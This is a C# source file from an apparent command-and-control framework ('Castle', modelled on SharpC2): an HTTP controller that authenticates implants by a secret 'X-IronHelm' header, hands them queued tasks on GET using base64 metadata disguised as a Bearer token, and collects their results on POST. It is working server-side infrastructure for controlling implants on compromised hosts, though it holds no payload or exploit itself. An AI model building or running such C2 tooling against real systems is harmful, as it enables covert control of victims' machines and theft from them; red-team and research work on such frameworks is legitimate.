using Castle.Helpers;
using Castle.Interfaces;
using Castle.Models.Knight;

using Microsoft.AspNetCore.Mvc;
using Newtonsoft.Json;
using System.Text;

namespace Castle.Models.Commander
{
    [Controller]
    public class HttpCommanderController : ControllerBase
    {
        private readonly IKnightService _soldierService;
        private readonly IRavenService _ravenService;
        private readonly IC2ProfileService _profileService;

        public HttpCommanderController(IKnightService soldierService, IRavenService ravenService, IC2ProfileService profileService)
        {
            _soldierService = soldierService;
            _ravenService = ravenService;
            _profileService = profileService;
        }

        private const string HeaderForPassd = "X-IronHelm"; // will be read from c2profile
        private const string Passwd = "HelmOfIron";

        public async Task<IActionResult> HandleImplant()
        {
            //////////                        

            if (HttpContext.Request.Headers.TryGetValue(HeaderForPassd, out var passwd))
            {
                Console.WriteLine($"+++ HandleImplant paswd check >> request:{passwd} ? {_profileService.ProfileHttpPasswd()}");

                if (passwd == _profileService.ProfileHttpPasswd())
                //if (passwd == Passwd)
                {
                    // Sending Ravens to Soldier
                    if (HttpContext.Request.Method == "GET")
                    {
                        var metadata = ExtractMetadata(HttpContext.Request.Headers);
                        if (metadata is null) return NotFound();

                        var outboundRavens = await _ravenService.GetOutboundRavens(metadata);

                        return new FileContentResult(outboundRavens.Serialise(), "application/octet-stream");// SharpC2 does this ... look at Drone HttpCommModule CheckIn() for how to read
                    }


                    // Receiving Ravens from Soldier
                    if (HttpContext.Request.Method == "POST")
                    {
                        string json;

                        using (var sr = new StreamReader(HttpContext.Request.Body))
                        {
                            json = await sr.ReadToEndAsync();
                        }


                        var ravens = JsonConvert.DeserializeObject<IEnumerable<Raven.Raven>>(json);
                        if (ravens != null)
                        {
                            await _ravenService.HandleInboundRavens(ravens);
                        }

                        return NoContent();
                    }
                }
            }
                        
            //return BadRequest();
            return NoContent();
        }

        private KnightMetadata? ExtractMetadata(IHeaderDictionary headers)
        {
            if (!headers.TryGetValue("Authorization", out var encodedMetadata))
                return null;

            // Will Return:
            //  Authorization: Bearer <base64>
            //  where "Bearer " is 7 char long

            encodedMetadata = encodedMetadata.ToString().Remove(0, 7);

            var json = Encoding.UTF8.GetString(Convert.FromBase64String(encodedMetadata));
            if (json is null)
            {
                return null;
            }

            return JsonConvert.DeserializeObject<KnightMetadata>(json);
        }
    }
}
